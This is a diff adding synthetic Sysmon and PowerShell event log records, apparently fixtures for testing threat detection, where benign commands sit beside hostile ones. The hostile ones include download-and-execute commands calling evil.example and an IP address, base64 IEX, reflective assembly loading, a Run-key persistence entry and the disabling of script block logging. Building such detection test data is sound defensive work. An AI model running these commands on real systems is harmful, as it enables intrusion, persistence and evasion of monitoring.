@@ -3265,4 +3265,552 @@
     <Data Name="ParentCommandLine" />
   </EventData>
 </Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:01:00.0000000Z" />
+    <EventRecordID>1</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:01:00.000</Data>
+    <Data Name="ProcessGuid">{3fb55176-73a3-4bc6-9ec0-aeed482c2d5a}</Data>
+    <Data Name="ProcessId">10001</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA</Data>
+    <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
+    <Data Name="User">CORP\jdoe</Data>
+    <Data Name="ParentProcessGuid">{f2903f6a-05a2-4dcf-9fe9-b16606a8b1b6}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:02:00.0000000Z" />
+    <EventRecordID>2</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS02</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:02:00.000</Data>
+    <Data Name="ProcessGuid">{ebb1c1b9-3a83-45ab-b694-5a1c896071a9}</Data>
+    <Data Name="ProcessId">10002</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -WindowStyle Hidden -Command Get-Process</Data>
+    <Data Name="CurrentDirectory">C:\Users\ksmith\</Data>
+    <Data Name="User">CORP\ksmith</Data>
+    <Data Name="ParentProcessGuid">{ac88d8fb-3d14-4bc6-b99c-6452d9c5fedb}</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine">cmd.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:03:00.0000000Z" />
+    <EventRecordID>3</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS03</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:03:00.000</Data>
+    <Data Name="ProcessGuid">{704147ab-bdff-4a6b-aff8-ed82c52a41a6}</Data>
+    <Data Name="ProcessId">10003</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File setup.ps1</Data>
+    <Data Name="CurrentDirectory">C:\Users\mwilson\</Data>
+    <Data Name="User">CORP\mwilson</Data>
+    <Data Name="ParentProcessGuid">{024c1b21-7e4f-4cdd-b146-8e08ad060f79}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:04:00.0000000Z" />
+    <EventRecordID>4</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS04</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:04:00.000</Data>
+    <Data Name="ProcessGuid">{fe67631a-1260-4d2a-ba9b-41767713f349}</Data>
+    <Data Name="ProcessId">10004</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -c (New-Object Net.WebClient).DownloadString('http://evil.example/stage2.ps1')</Data>
+    <Data Name="CurrentDirectory">C:\Users\tlee\</Data>
+    <Data Name="User">CORP\tlee</Data>
+    <Data Name="ParentProcessGuid">{a5163e69-82ef-4339-beee-5eaa329ae94a}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:05:00.0000000Z" />
+    <EventRecordID>5</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS05</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:05:00.000</Data>
+    <Data Name="ProcessGuid">{0f29869b-007f-488b-808e-5114a2bb4e74}</Data>
+    <Data Name="ProcessId">10005</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -c Invoke-WebRequest http://185.220.101.50/payload</Data>
+    <Data Name="CurrentDirectory">C:\Users\pgomez\</Data>
+    <Data Name="User">CORP\pgomez</Data>
+    <Data Name="ParentProcessGuid">{0c27402a-7f1c-4bfb-81bd-8e2056f79be7}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>3</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:05:12.0000000Z" />
+    <EventRecordID>6</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS05</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:05:12.000</Data>
+    <Data Name="ProcessGuid">{0f29869b-007f-488b-808e-5114a2bb4e74}</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="User">CORP\pgomez</Data>
+    <Data Name="Protocol">tcp</Data>
+    <Data Name="SourceIp">192.168.1.50</Data>
+    <Data Name="SourcePort">49512</Data>
+    <Data Name="DestinationIp">185.220.101.50</Data>
+    <Data Name="DestinationPort">443</Data>
+    <Data Name="DestinationHostname" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:06:12.0000000Z" />
+    <EventRecordID>7</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS06</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:06:12.000</Data>
+    <Data Name="ProcessGuid">{b83a53f5-e1b0-40f1-b7f8-eb9292666177}</Data>
+    <Data Name="ProcessId">10007</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -File C:\Scripts\backup.ps1</Data>
+    <Data Name="CurrentDirectory">C:\Users\swhite\</Data>
+    <Data Name="User">CORP\swhite</Data>
+    <Data Name="ParentProcessGuid">{b548a5a4-bcea-4808-b059-0fa7962538ce}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:07:12.0000000Z" />
+    <EventRecordID>8</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS07</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:07:12.000</Data>
+    <Data Name="ProcessGuid">{d9bae731-c00d-46f4-8cf1-386e1543a85d}</Data>
+    <Data Name="ProcessId">10008</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -c IEX ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('...')))</Data>
+    <Data Name="CurrentDirectory">C:\Users\bwong\</Data>
+    <Data Name="User">CORP\bwong</Data>
+    <Data Name="ParentProcessGuid">{171a991f-2740-4cec-896c-17c59e20b912}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:08:12.0000000Z" />
+    <EventRecordID>9</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS08</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:08:12.000</Data>
+    <Data Name="ProcessGuid">{70ff748d-adef-429a-b1f9-83a2e5996e3b}</Data>
+    <Data Name="ProcessId">10009</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -c Get-Process</Data>
+    <Data Name="CurrentDirectory">C:\Users\cchen\</Data>
+    <Data Name="User">CORP\cchen</Data>
+    <Data Name="ParentProcessGuid">{a4c5bf5a-79d7-40e8-ad7f-4691142e9b4f}</Data>
+    <Data Name="ParentImage">C:\Program Files\Java\jre\bin\java.exe</Data>
+    <Data Name="ParentCommandLine">java.exe -jar app.jar</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:09:12.0000000Z" />
+    <EventRecordID>10</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS09</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:09:12.000</Data>
+    <Data Name="ProcessGuid">{feb1b068-ea42-4b11-93dd-912a86e11cc1}</Data>
+    <Data Name="ProcessId">10010</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -c Set-ItemProperty -Path HKCU:\...\Run -Name Updater -Value C:\Users\dking\AppData\Local\Temp\up.exe</Data>
+    <Data Name="CurrentDirectory">C:\Users\dking\</Data>
+    <Data Name="User">CORP\dking</Data>
+    <Data Name="ParentProcessGuid">{6005be66-3b80-42ed-b8ad-240ddcd8fa8a}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>13</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:09:20.0000000Z" />
+    <EventRecordID>11</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS09</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:09:20.000</Data>
+    <Data Name="ProcessGuid">{feb1b068-ea42-4b11-93dd-912a86e11cc1}</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="TargetObject">HKU\S-1-5-21-111-222-333-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater</Data>
+    <Data Name="Details">C:\Users\dking\AppData\Local\Temp\up.exe</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>13</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:10:20.0000000Z" />
+    <EventRecordID>12</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-DC01</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:10:20.000</Data>
+    <Data Name="ProcessGuid">{19ecf063-cd21-4b6b-b050-95ec21236003}</Data>
+    <Data Name="Image">C:\Windows\System32\reg.exe</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="TargetObject">HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging</Data>
+    <Data Name="Details">DWORD (0x00000000)</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4104</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:11:20.0000000Z" />
+    <EventRecordID>13</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>WIN-WKS10</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://evil.example/loader.ps1'); [Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAMAAAAEAAAA...'))</Data>
+    <Data Name="ScriptBlockId">{9bc8f1aa-01fa-4f65-9778-5c64ab2de84e}</Data>
+    <Data Name="Path" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:13:20.0000000Z" />
+    <EventRecordID>14</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS11</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:13:20.000</Data>
+    <Data Name="ProcessGuid">{670e4fc3-42a9-4682-a344-8f740bcf1b70}</Data>
+    <Data Name="ProcessId">10014</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -Command Get-ChildItem C:\Users\emartin\Documents</Data>
+    <Data Name="CurrentDirectory">C:\Users\emartin\</Data>
+    <Data Name="User">CORP\emartin</Data>
+    <Data Name="ParentProcessGuid">{8f4a77c9-4324-4455-84be-cc2be4bfd808}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:14:20.0000000Z" />
+    <EventRecordID>15</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS12</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:14:20.000</Data>
+    <Data Name="ProcessGuid">{4102bb2f-a67e-4420-a91d-7cd65b06cd1f}</Data>
+    <Data Name="ProcessId">10015</Data>
+    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="CommandLine">cmd.exe /c dir</Data>
+    <Data Name="CurrentDirectory">C:\Users\fowen\</Data>
+    <Data Name="User">CORP\fowen</Data>
+    <Data Name="ParentProcessGuid">{a330bea9-b01c-4893-b128-2a0ba2d03a5d}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>1</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:15:20.0000000Z" />
+    <EventRecordID>16</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS13</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:15:20.000</Data>
+    <Data Name="ProcessGuid">{5f93ff61-09b3-49b4-b8f0-8dbecb9a47a2}</Data>
+    <Data Name="ProcessId">10016</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -Command Get-Service</Data>
+    <Data Name="CurrentDirectory">C:\Users\gtan\</Data>
+    <Data Name="User">CORP\gtan</Data>
+    <Data Name="ParentProcessGuid">{62ccd0ee-5921-499e-b0b4-93a9202832f0}</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>3</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:15:30.0000000Z" />
+    <EventRecordID>17</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS13</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:15:30.000</Data>
+    <Data Name="ProcessGuid">{5f93ff61-09b3-49b4-b8f0-8dbecb9a47a2}</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="User">CORP\gtan</Data>
+    <Data Name="Protocol">tcp</Data>
+    <Data Name="SourceIp">192.168.1.50</Data>
+    <Data Name="SourcePort">49512</Data>
+    <Data Name="DestinationIp">13.107.42.14</Data>
+    <Data Name="DestinationPort">443</Data>
+    <Data Name="DestinationHostname" />
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+    <EventID>13</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:16:30.0000000Z" />
+    <EventRecordID>18</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WIN-WKS14</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="UtcTime">2026-02-10 10:16:30.000</Data>
+    <Data Name="ProcessGuid">{18fcaca1-319a-4608-ac47-0ea74dcb9009}</Data>
+    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\SomeService\Start</Data>
+    <Data Name="Details">2</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+    <EventID>4104</EventID>
+    <Version>1</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2026-02-10T10:17:30.0000000Z" />
+    <EventRecordID>19</EventRecordID>
+    <Correlation />
+    <Execution ProcessID="600" ThreadID="700" />
+    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+    <Computer>WIN-WKS15</Computer>
+    <Security UserID="S-1-5-18" />
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">Get-Process | Where-Object {$_.CPU -gt 100} | Sort-Object CPU -Descending</Data>
+    <Data Name="ScriptBlockId">{bc52f791-0faf-4ed4-ae0d-14e3248fc4a2}</Data>
+    <Data Name="Path">C:\Scripts\monitor.ps1</Data>
+  </EventData>
+</Event>
 </Events>
